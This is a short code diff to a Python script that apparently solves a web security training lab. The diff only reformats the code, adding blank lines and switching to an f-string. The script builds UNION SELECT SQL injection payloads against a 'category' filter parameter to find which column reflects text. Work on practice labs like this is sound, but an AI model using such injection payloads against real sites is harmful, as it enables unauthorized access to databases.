@@ -5,6 +5,7 @@ import bs4
 
 import lab_03
 
+
 class Lab(lab_03.Lab):
     """Wrapper"""
 
@@ -19,7 +20,7 @@ class Lab(lab_03.Lab):
         query = "'+UNION+SELECT+{}{}{}".format(",".join(nulls), table,
                                                self.comment)
         payload = {self.key: query}
-        payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
+        payload_str = "&".join(f"{k}={v}" for k, v in payload.items())
         response = self.session.get(self.url + self.path, params=payload_str)
         return response.status_code == 200
 
@@ -40,11 +41,13 @@ class Lab(lab_03.Lab):
                 return i
         raise RuntimeError(f"Failed to identify index for {text}")
 
+
 def main() -> None:
     """Entry point"""
     site = Lab(key="category", path="/filter")
     text = site.query_string()
     print(site.column_index_for_query(text=text))
+
 
 if __name__ == "__main__":
     main()
